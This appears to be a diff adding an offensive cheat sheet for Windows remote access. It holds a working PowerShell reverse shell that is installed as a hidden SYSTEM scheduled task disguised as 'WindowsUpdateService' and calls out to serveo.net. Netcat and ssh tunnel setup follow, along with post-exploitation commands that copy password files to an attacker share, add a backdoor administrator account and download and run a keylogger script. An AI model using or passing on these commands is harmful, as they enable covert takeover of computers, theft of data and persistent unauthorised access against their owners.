@@ -1,0 +1,63 @@
+Windows (Payload)
+
+$ IN ADMIN COMMAND PROMP
+schtasks /create /tn "WindowsUpdateService" /tr "powershell -window hidden -command \"while(1){try{\$p=(irm 'https://raw.githubusercontent.com/indopride0910/kitty/refs/heads/main/port.txt').Trim();\$c=New-Object Net.Sockets.TCPClient('serveo.net',\$p);if(\$c.Connected){\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while(\$c.Connected -and (\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$x=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$x,0,\$x.Length);\$s.Flush()};\$c.Close()}}catch{};Start-Sleep 30}\"" /sc onstart /ru System /f
+
+$ CHECK THE PAYLOAD
+schtasks /query /tn "WindowsUpdateService"
+
+$ RUN THE PAYLOAD
+schtasks /run /tn "WindowsUpdateService"
+
+$ DELETE THE PAYLOAD
+schtasks /delete /tn "WindowsUpdateService" /f
+
+
+
+
+Linux (Attacker)
+
+$ Generate a TCP
+ssh -R 0:localhost:4444 serveo.net
+
+$ Start Netcat Listener
+nc -lvnp 4444
+
+
+
+Useful Command
+
+# Execute any command
+whoami                    # See current user
+systeminfo               # Get system information
+ipconfig                 # Network information
+shutdown /r /t 0         # Restart computer
+
+# Browse and manipulate files
+dir C:\Users\            # List users
+cd C:\Windows\System32   # Navigate to system folders
+type secret.txt          # Read files
+del important.file       # Delete files
+
+# Explore the network
+net view                 # See other computers
+net user                 # List users
+arp -a                   # Network neighbors
+nslookup google.com      # DNS queries
+
+# Copy and exfiltrate data
+copy C:\passwords.txt \\attacker-server\share
+
+# Create more backdoors
+net user hacker Password123! /add
+net localgroup administrators hacker /add
+
+
+REAL TIME SENARIO
+
+# Find and copy sensitive files
+dir /s *.docx *.pdf *.xlsx
+copy C\:Users\*.docx C:\Windows\Temp\
+
+# Start keylogger (additional payload)
+iex (New-Object Net.WebClient).DownloadString('http://keylogger-script')
